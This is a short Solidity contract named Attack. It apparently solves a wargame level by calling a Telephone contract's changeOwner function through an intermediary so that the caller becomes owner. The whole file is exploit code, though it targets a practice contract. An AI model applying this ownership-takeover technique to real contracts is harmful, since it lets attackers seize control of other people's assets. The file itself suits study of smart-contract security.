// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Telephone.sol";

contract Attack {
    Telephone target;

    constructor(address _target) {
        target = Telephone(_target);
    }

    function exploit() public  {
        target.changeOwner(msg.sender);
    }
}